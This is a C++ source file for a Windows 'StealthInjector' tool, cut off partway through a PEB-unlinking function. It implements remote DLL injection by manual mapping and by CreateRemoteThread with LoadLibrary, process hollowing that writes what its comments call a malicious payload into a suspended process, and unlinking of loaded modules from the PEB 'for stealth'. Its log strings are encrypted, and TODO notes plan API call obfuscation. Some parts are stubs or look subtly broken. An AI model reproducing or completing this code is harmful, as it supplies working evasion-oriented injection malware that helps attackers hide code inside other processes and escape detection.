#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stringapiset.h>
#include <string.h>
#include <map>
#include <wchar.h>
#include "StealthInjector.h"
#include <fstream>
#include <chrono>
#include <ctime>
#include <iomanip>
#include <vector> // Required for std::vector
#include <tlhelp32.h> // Required for MODULEENTRY32, CreateToolhelp32Snapshot
#include <ntstatus.h>
#include <winternl.h> // For PROCESS_BASIC_INFORMATION and PEB structures // For NTSTATUS definition

void StealthInjector::LogMessage(const std::wstring& message)
{
    std::wofstream logFile(StealthInjector::GetDecryptedString(1), std::ios_base::app);
    if (logFile.is_open())
    {
        auto now = std::chrono::system_clock::now();
        auto in_time_t = std::chrono::system_clock::to_time_t(now);
        logFile << L"[" << std::put_time(std::localtime(&in_time_t), L"%Y-%m-%d %H:%M:%S") << L"] " << message << std::endl;
        logFile.close();
    }
  }
  void StealthInjector::DisplayError(DWORD errorCode, const std::wstring& message)
{
    StealthInjector::LogMessage(message + L". Error Code: " + std::to_wstring(errorCode));
    // MessageBox(NULL, message.c_str(), L"Error", MB_OK | MB_ICONERROR);
}

// Define NtQueryInformationProcess function pointer
typedef NTSTATUS(NTAPI* f_NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// Add Manual Mapping function
bool StealthInjector::InjectStealthDLL(DWORD dwProcessId, const std::wstring& dllPath, bool pebUnlink) {
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(65) + std::to_wstring(dwProcessId)); // Starting DLL injection for process ID
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(66) + dllPath);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == nullptr) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(67));
        return false;
    }

    // Read DLL file into memory
    std::ifstream file(dllPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(68) + dllPath);
        return false;
    }
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> dllData(fileSize);
    file.read(dllData.data(), fileSize);
    file.close();

    // Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllData.data();
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        StealthInjector::DisplayError(0, StealthInjector::GetDecryptedString(69) + dllPath);
        return false;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dllData.data() + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        StealthInjector::DisplayError(0, StealthInjector::GetDecryptedString(70) + dllPath);
        return false;
    }
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(52)); // PE headers parsed successfully.

    // Allocate memory in the target process at the preferred base address
    LPVOID remoteBase = VirtualAllocEx(hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        // If preferred address is taken, try allocating anywhere
        remoteBase = VirtualAllocEx(hProcess, nullptr, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) {
            StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(71) + dllPath);
            return false;
        }
    }
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(55)); // DLL sections written to target process.
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(53)); // Memory allocated in target process.

    // Write the DLL headers to the remote process
    if (!WriteProcessMemory(hProcess, remoteBase, dllData.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, nullptr)) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(72) + dllPath);
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        return false;
    }
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(54)); // DLL headers written to target process.

    // Get the address of NtQueryInformationProcess
    f_NtQueryInformationProcess NtQueryInformationProcess = (f_NtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        StealthInjector::LogMessage(StealthInjector::GetDecryptedString(61));
        CloseHandle(hProcess);
        return false;
    }

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength = 0;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);

    if (status != 0) {
        StealthInjector::LogMessage(StealthInjector::GetDecryptedString(62));
        CloseHandle(hProcess);
        return false;
    }

    // Read the PEB from the remote process
    PEB peb;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL)) {
        StealthInjector::LogMessage(StealthInjector::GetDecryptedString(63));
        CloseHandle(hProcess);
        return false;
    }

    // Read the PEB_LDR_DATA from the remote process
    PEB_LDR_DATA ldrData;
    if (!ReadProcessMemory(hProcess, peb.Ldr, &ldrData, sizeof(PEB_LDR_DATA), NULL)) {
        StealthInjector::LogMessage(StealthInjector::GetDecryptedString(64));
        CloseHandle(hProcess);
        return false;
    }

    // Map sections
    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(hProcess, (LPVOID)((BYTE*)remoteBase + pSectionHeader[i].VirtualAddress), (LPVOID)((BYTE*)dllData.data() + pSectionHeader[i].PointerToRawData), pSectionHeader[i].SizeOfRawData, nullptr)) {
            StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(8) + dllPath);
            VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
            return false;
        }
    }

    // Prepare MANUAL_MAPPING_DATA
    MANUAL_MAPPING_DATA data = { 0 };
    data.pDllMain = reinterpret_cast<StealthInjector::f_DLL_ENTRY_POINT>(static_cast<void*>((BYTE*)remoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint));
    data.pModuleBase = (BYTE*)remoteBase;
    data.pLoadLibraryA = (StealthInjector::f_LoadLibraryA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    data.pGetProcAddress = (StealthInjector::f_GetProcAddress)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(56)); // MANUAL_MAPPING_DATA prepared.

    // Allocate memory for MANUAL_MAPPING_DATA in the remote process
    LPVOID remoteData = VirtualAllocEx(hProcess, nullptr, sizeof(MANUAL_MAPPING_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteData) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(73) + dllPath);
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        return false;
    }

    // Write MANUAL_MAPPING_DATA to the remote process
    if (!WriteProcessMemory(hProcess, remoteData, &data, sizeof(MANUAL_MAPPING_DATA), nullptr)) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(74) + dllPath);
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE);
        return false;
    }
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(57)); // Shellcode allocated and written.

    // Allocate memory for shellcode in the remote process
    LPVOID remoteShellcode = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(75) + dllPath);
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE);
        return false;
    }

    // Write shellcode to the remote process
    if (!WriteProcessMemory(hProcess, remoteShellcode, static_cast<void*>(Shellcode), 0x1000, nullptr)) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(76) + dllPath);
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        return false;
    }

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteShellcode, remoteData, 0, nullptr);
    if (!hThread) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(77) + dllPath);
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        return false;
    }
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(58)); // Remote thread created for shellcode execution.

    WaitForSingleObject(hThread, INFINITE);
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(59)); // Remote thread execution completed.

    // PEB unlinking (if enabled)
    if (pebUnlink) {
        StealthInjector::LogMessage(StealthInjector::GetDecryptedString(60)); // PEB unlinking initiated.
        // ... existing PEB unlinking code ...
        StealthInjector::LogMessage(StealthInjector::GetDecryptedString(61)); // PEB unlinking completed.
    }

    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(78) + dllPath);
    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteData, 0, MEM_RELEASE); // Free the data structure
    VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE); // Free the shellcode
    CloseHandle(hProcess);
    return true;
}

void WINAPI StealthInjector::EstablishHook(DWORD dwProcessId, const std::wstring& dllPath)
{
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(79) + std::to_wstring(dwProcessId) + L" with DLL " + dllPath);
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == nullptr) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(67));
        return;
    }

    // Use Manual Mapping instead of LoadLib
    if (!InjectStealthDLL(dwProcessId, dllPath, false)) {
        StealthInjector::LogMessage(StealthInjector::GetDecryptedString(80) + std::to_wstring(dwProcessId) + L", DLL: " + dllPath);
        CloseHandle(hProcess);
        return;
    }

    CloseHandle(hProcess);
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(81) + std::to_wstring(dwProcessId) + L" with DLL " + dllPath);
}

void StealthInjector::UnSetHook(DWORD dwProcessId, const std::wstring& dllPath)
{
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(81) + std::to_wstring(dwProcessId) + L" with DLL " + dllPath);
    if (!FreeLib(dwProcessId, dllPath))
    {
        StealthInjector::LogMessage(StealthInjector::GetDecryptedString(65) + dllPath);
        // StealthInjector::LogMessage(L"UnSetHook: Failed to eject DLL");
    }
    else
    {
        StealthInjector::LogMessage(StealthInjector::GetDecryptedString(82));
    }
}

BOOL StealthInjector::LoadLib(DWORD dwProcessId, const std::wstring& dllPath)
{
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(52) + std::to_wstring(dwProcessId));

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == nullptr) {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(53));
        return FALSE;
    }

    LPVOID lpRemoteBuf = nullptr;
    SIZE_T dwBufSize = (dllPath.length() + 1) * sizeof(WCHAR);
    HANDLE hThread = nullptr;

    lpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!lpRemoteBuf)
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(54));
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the DLL path to the remote process memory
    if (!WriteProcessMemory(hProcess, lpRemoteBuf, dllPath.c_str(), dwBufSize, NULL))
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(55));
        VirtualFreeEx(hProcess, lpRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get the address of LoadLibraryW in the remote process
    LPVOID lpLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!lpLoadLibrary)
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(56));
        VirtualFreeEx(hProcess, lpRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create a remote thread to call LoadLibraryW
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLibrary, lpRemoteBuf, 0, NULL);
    if (!hThread)
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(57));
        VirtualFreeEx(hProcess, lpRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Get the exit code of the remote thread (DLL module handle)
    DWORD dwExitCode = 0;
    GetExitCodeThread(hThread, &dwExitCode);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, lpRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    if (dwExitCode == 0)
    {
        StealthInjector::DisplayError(0, StealthInjector::GetDecryptedString(58)); // Generic error for failed injection
        return FALSE;
    }

    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(59) + dllPath);
    return TRUE;
}

BOOL StealthInjector::FreeLib(DWORD dwProcessId, const std::wstring& dllPath)
{
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(83) + std::to_wstring(dwProcessId));
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (!hProcess)
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(84));
        return FALSE;
    }

    // Get the module handle of the injected DLL in the remote process
    HMODULE hMod = NULL;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, dwProcessId);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(85));
        CloseHandle(hProcess);
        return FALSE;
    }

    MODULEENTRY32 me32;
    me32.dwSize = sizeof(MODULEENTRY32);
    if (!Module32First(hSnapshot, &me32))
    {
          StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(86));
    }

    do
    {
        if (CompareStringOrdinal(me32.szModule, -1, dllPath.c_str(), -1, TRUE) == CSTR_EQUAL)
        {
            hMod = me32.hModule;
            break;
        }
    } while (Module32Next(hSnapshot, &me32));

    CloseHandle(hSnapshot);

    if (hMod == NULL)
    {
     StealthInjector::DisplayError(0, StealthInjector::GetDecryptedString(34));
    }

    // Get the address of FreeLibrary in the remote process
    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "FreeLibrary");
    if (!pfnThreadRtn)
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(35));
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create a remote thread to call FreeLibrary
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, hMod, 0, NULL);
    if (!hThread)
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(36));
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(37));
    return TRUE;
}

BOOL StealthInjector::ProcessHollowingInject(DWORD dwProcessId, const std::wstring& targetProcessPath, const std::wstring& payloadPath)
{
    StealthInjector::LogMessage(L"Starting Process Hollowing Injection for PID: " + std::to_wstring(dwProcessId) + L" with payload: " + payloadPath);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create the target process in a suspended state
    if (!CreateProcess(targetProcessPath.c_str(),   // Application name
                       NULL,                    // Command line
                       NULL,                    // Process handle not inheritable
                       NULL,                    // Thread handle not inheritable
                       FALSE,                   // Set handle inheritance to FALSE
                       CREATE_SUSPENDED,        // Creation flags
                       NULL,                    // Use parent's environment block
                       NULL,                    // Use parent's starting directory
                       &si,                     // Pointer to STARTUPINFO structure
                       &pi))                    // Pointer to PROCESS_INFORMATION structure
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to create suspended process.");
        return FALSE;
    }

    // Get context of the suspended thread
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx))
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to get thread context.");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Read PEB to get ImageBaseAddress
    // For x64, PEB is at gs:[0x60]
    // For x86, PEB is at fs:[0x30]
#ifdef _WIN64
    DWORD64 pebAddress = ctx.Rdx + 0x10; // Rdx points to PEB for x64
#else
    DWORD pebAddress = ctx.Ebx + 0x8; // Ebx points to PEB for x86
#endif

    PROCESS_BASIC_INFORMATION pbi;
    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != 0)
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to query process information.");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Read the image base address from the PEB
    LPVOID imageBase = ((PPEB)pbi.PebBaseAddress)->ImageBaseAddress;

    // Unmap the original executable from the target process
    // Need to define ZwUnmapViewOfSection
    typedef NTSTATUS(NTAPI* f_ZwUnmapViewOfSection)(
        HANDLE ProcessHandle,
        PVOID BaseAddress
        );

    f_ZwUnmapViewOfSection ZwUnmapViewOfSection = (f_ZwUnmapViewOfSection)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "ZwUnmapViewOfSection");
    if (!ZwUnmapViewOfSection)
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to get ZwUnmapViewOfSection address.");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    if (ZwUnmapViewOfSection(pi.hProcess, imageBase) != 0)
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to unmap view of section.");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Read the payload (DLL) file
    std::ifstream file(payloadPath, std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        StealthInjector::DisplayError(0, L"Failed to open payload file: " + payloadPath);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<char> buffer(fileSize);
    if (!file.read(buffer.data(), fileSize))
    {
        StealthInjector::DisplayError(0, L"Failed to read payload file: " + payloadPath);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Allocate new memory in the target process for the malicious payload
    LPVOID remoteBaseAddress = VirtualAllocEx(pi.hProcess, imageBase, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBaseAddress == NULL)
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to allocate memory in remote process.");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Write the payload into the allocated memory
    if (!WriteProcessMemory(pi.hProcess, remoteBaseAddress, buffer.data(), fileSize, NULL))
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to write payload to remote process.");
        VirtualFreeEx(pi.hProcess, remoteBaseAddress, 0, MEM_RELEASE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Get the entry point of the payload
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer.data();
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)buffer.data() + pDosHeader->e_lfanew);

    LPVOID entryPoint = (LPVOID)((BYTE*)remoteBaseAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

    // Modify the execution context (EAX/RIP) to point to the payload's entry point
#ifdef _WIN64
    ctx.Rcx = (DWORD64)entryPoint; // For x64, entry point is in Rcx
#else
    ctx.Eax = (DWORD)entryPoint; // For x86, entry point is in Eax
#endif

    if (!SetThreadContext(pi.hThread, &ctx))
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to set thread context.");
        VirtualFreeEx(pi.hProcess, remoteBaseAddress, 0, MEM_RELEASE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Unlink the module from PEB for stealth
    StealthInjector::UnlinkModuleFromPeb(pi.hProcess, remoteBaseAddress);

    // Resume the suspended process
    if (ResumeThread(pi.hThread) == (DWORD)-1)
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to resume thread.");
        VirtualFreeEx(pi.hProcess, remoteBaseAddress, 0, MEM_RELEASE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    StealthInjector::LogMessage(L"Process Hollowing Injection successful for PID: " + std::to_wstring(dwProcessId));

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
    // TODO: Implement Unmap the original code section of the suspended process
    // TODO: Implement Allocate new memory in the target process for the malicious payload
    // TODO: Implement Write the malicious payload (placeholder) into the allocated memory
    // TODO: Implement Modify the execution context (EAX/RIP) to point to the payload's entry point
    // TODO: Implement Resume the suspended process
    // TODO: Implement Add comprehensive error handling and logging for all process hollowing steps
    // TODO: Implement Integrate PEB unlinking into the process hollowing flow
    // TODO: Implement API call obfuscation (e.g., dynamic resolution) for critical functions

    return FALSE; // Placeholder
}

DWORD StealthInjector::GetProcessId(LPCWSTR lpszProcessName)
{
    StealthInjector::LogMessage(StealthInjector::GetDecryptedString(38) + std::wstring(lpszProcessName));
    DWORD dwProcessId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(39));
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32))
    {
        StealthInjector::DisplayError(GetLastError(), StealthInjector::GetDecryptedString(40));
        CloseHandle(hSnapshot);
        return 0;
    }

    do
    {
        if (CompareStringOrdinal(pe32.szExeFile, -1, lpszProcessName, -1, TRUE) == CSTR_EQUAL)
        {
            dwProcessId = pe32.th32ProcessID;
            StealthInjector::LogMessage(StealthInjector::GetDecryptedString(41) + std::to_wstring(dwProcessId) + L" for " + std::wstring(lpszProcessName));
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    if (dwProcessId == 0)
    {
        StealthInjector::DisplayError(0, StealthInjector::GetDecryptedString(42));
    }

    return dwProcessId;
}

// Define necessary structures for PEB unlinking


// Function to unlink a module from the PEB's module lists
bool StealthInjector::UnlinkModuleFromPeb(HANDLE hProcess, LPVOID moduleBase)
{
    PROCESS_BASIC_INFORMATION pbi;
    SIZE_T bytesRead;

    // Get ProcessBasicInformation to find PEB address
    f_NtQueryInformationProcess NtQueryInformationProcess = (f_NtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
    if (!NtQueryInformationProcess)
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to get NtQueryInformationProcess address.");
        return false;
    }

    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), (PULONG)&bytesRead) != 0)
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to query process information.");
        return false;
    }

    // Read PEB
    PEB peb;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead))
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to read PEB.");
        return false;
    }

    // Read PEB_LDR_DATA
    PEB_LDR_DATA ldr;
    if (!ReadProcessMemory(hProcess, peb.Ldr, &ldr, sizeof(ldr), &bytesRead))
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to read PEB_LDR_DATA.");
        return false;
    }

    // Unlink from InLoadOrderModuleList
    LIST_ENTRY *pInLoadOrderModuleList = (LIST_ENTRY*)((PCHAR)peb.Ldr + offsetof(PEB_LDR_DATA, InLoadOrderModuleList));
    LIST_ENTRY *pInMemoryOrderModuleList = (LIST_ENTRY*)((PCHAR)peb.Ldr + offsetof(PEB_LDR_DATA, InMemoryOrderModuleList));
    LIST_ENTRY *pInInitializationOrderModuleList = (LIST_ENTRY*)((PCHAR)peb.Ldr + offsetof(PEB_LDR_DATA, InInitializationOrderModuleList));

    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;

    if (!ReadProcessMemory(hProcess, pInLoadOrderModuleList, &InLoadOrderModuleList, sizeof(LIST_ENTRY), &bytesRead))
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to read InLoadOrderModuleList head.");
        return false;
    }
    if (!ReadProcessMemory(hProcess, pInMemoryOrderModuleList, &InMemoryOrderModuleList, sizeof(LIST_ENTRY), &bytesRead))
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to read InMemoryOrderModuleList head.");
        return false;
    }
    if (!ReadProcessMemory(hProcess, pInInitializationOrderModuleList, &InInitializationOrderModuleList, sizeof(LIST_ENTRY), &bytesRead))
    {
        StealthInjector::DisplayError(GetLastError(), L"Failed to read InInitializationOrderModuleList head.");
        return false;
    }

    // Traverse and unlink
    LIST_ENTRY *pCurrentEntry;
    LDR_DATA_TABLE_ENTRY ldrEntry;

    // InLoadOrderModuleList
    pCurrentEntry = InLoadOrderModuleList.Flink;
    while (pCurrentEntry != pInLoadOrderModuleList)
    {
        if (!ReadProcessMemory(hProcess, (LPVOID)pCurrentEntry, &ldrEntry, sizeof(ldrEntry), &bytesRead))
        {
            StealthInjector::DisplayError(GetLastError(), L"Failed to read LDR_DATA_TABLE_ENTRY from InLoadOrderModuleList.");
            return false;
        }

        if (ldrEntry.DllBase == moduleBase)
        {
            LIST_ENTRY prevEntry, nextEntry;
            if (!ReadProcessMemory(hProcess, ldrEntry.InLoadOrderLinks.Blink, &prevEntry, sizeof(LIST_ENTRY), &bytesRead) ||
                !ReadProcessMemory(hProcess, ldrEntry.InLoadOrderLinks.Flink, &nextEntry, sizeof(LIST_ENTRY), &bytesRead))
            {
                StealthInjector::DisplayError(GetLastError(), L"Failed to read adjacent entries for unlinking from InLoadOrderModuleList.");
                return false;
            }

            // Update Flink of previous entry
            if (!WriteProcessMemory(hProcess, (LPVOID)((PCHAR)ldrEntry.InLoadOrderLinks.Blink + offsetof(LIST_ENTRY, Flink)), &ldrEntry.InLoadOrderLinks.Flink, sizeof(PVOID), &bytesRead))
            {
                StealthInjector::DisplayError(GetLastError(), L"Failed to update Flink of previous entry in InLoadOrderModuleList.");
                return false;
            }
            // Update Blink of next entry
            if (!WriteProcessMemory(hProcess, (LPVOID)((PCHAR)ldrEntry.InLoadOrderLinks.Flink + offsetof(LIST_ENTRY, Blink)), &ldrEntry.InLoadOrderLinks.Blink, sizeof(PVOID), &bytesRead))
            {
                StealthInjector::DisplayError(GetLastError(), L"Failed to update Blink of next entry in InLoadOrderModuleList.");
                return false;
            }
            StealthInjector::LogMessage(L"Module unlinked from InLoadOrderModuleList.");
            break;
        }
        pCurrentEntry = ldrEntry.InLoadOrderLinks.Flink;
    }

    // InMemoryOrderModuleList
    pCurrentEntry = InMemoryOrderModuleList.Flink;
    while (pCurrentEntry != pInMemoryOrderModuleList)
    {
        if (!ReadProcessMemory(hProcess, (LPVOID)pCurrentEntry, &ldrEntry, sizeof(ldrEntry), &bytesRead))
        {
            StealthInjector::DisplayError(GetLastError(), L"Failed to read LDR_DATA_TABLE_ENTRY from InMemoryOrderModuleList.");
            return false;
        }

        if (ldrEntry.DllBase == moduleBase)
        {
            LIST_ENTRY prevEntry, nextEntry;
            if (!ReadProcessMemory(hProcess, ldrEntry.InMemoryOrderLinks.Blink, &prevEntry, sizeof(LIST_ENTRY), &bytesRead) ||
                !ReadProcessMemory(hProcess, ldrEntry.InMemoryOrderLinks.Flink, &nextEntry, sizeof(LIST_ENTRY), &bytesRead))
            {
                StealthInjector::DisplayError(GetLastError(), L"Failed to read adjacent entries for unlinking from InMemoryOrderModuleList.");
                return false;
            }

            // Update Flink of previous entry
            if (!WriteProcessMemory(hProcess, (LPVOID)((PCHAR)ldrEntry.InMemoryOrderLinks.Blink + offsetof(LIST_ENTRY, Flink)), &ldrEntry.InMemoryOrderLinks.Flink, sizeof(PVOID), &bytesRead))
            {
                StealthInjector::DisplayError(GetLastError(), L"Failed to update Flink of previous entry in InMemoryOrderModuleList.");
                return false;
            }
            // Update Blink of next entry
